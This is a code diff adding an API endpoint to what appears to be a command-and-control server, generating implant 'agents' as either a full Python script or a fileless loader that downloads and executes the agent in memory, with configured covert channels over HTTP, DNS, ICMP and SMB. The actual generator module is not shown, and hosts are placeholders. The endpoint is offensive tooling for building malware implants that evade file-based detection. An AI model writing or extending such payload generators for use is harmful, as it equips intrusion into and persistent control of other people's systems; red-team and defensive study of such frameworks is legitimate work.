@@ -216,3 +216,39 @@ def api_list_agents():
     """
     agents = list_agents()
     return {"agents": agents}
+
+class AgentGenerationRequest(BaseModel):
+    """
+    Data required for generating an agent.
+    Attributes:
+        agent_id (str): Unique identifier for the agent.
+        mode (str): "file" for a file-based agent, "fileless" for an in-memory loader.
+    """
+    agent_id: str
+    mode: str  # Expected values: "file" or "fileless"
+
+
+@app.post("/api/agent/generate")
+def api_generate_agent(request: AgentGenerationRequest):
+    """
+    Generate an agent payload based on operator parameters.
+    The server uses a templating engine to produce either a full Python agent script (file-based)
+    or a small loader that downloads and executes the agent payload in memory (fileless).
+    """
+    # Build a default agent configuration. In a production setting, you might use a more dynamic configuration.
+    default_agent_config = {
+        "agent_id": request.agent_id,
+        "auth_token": "sample_token_123",  # This might be generated or passed in a real scenario.
+        "poll_interval": 10,
+        "protocols": {
+            "http": {"enabled": True, "server_url": "http://localhost:8000"},
+            "dns": {"enabled": True, "dns_server_ip": "127.0.0.1"},
+            "icmp": {"enabled": False, "target_ip": "127.0.0.1"},
+            "smb": {"enabled": True, "server_ip": "127.0.0.1"}
+        },
+        # For fileless agents, this URL should point to the hosted full agent payload.
+        "agent_payload_url": "https://yourserver.com/agent_payload.py"
+    }
+    from Agent.agent_generator import generate_agent  # Ensure this module exists and is in the proper path.
+    filename = generate_agent(default_agent_config, request.mode)
+    return {"message": f"Agent generated and saved as {filename}"}
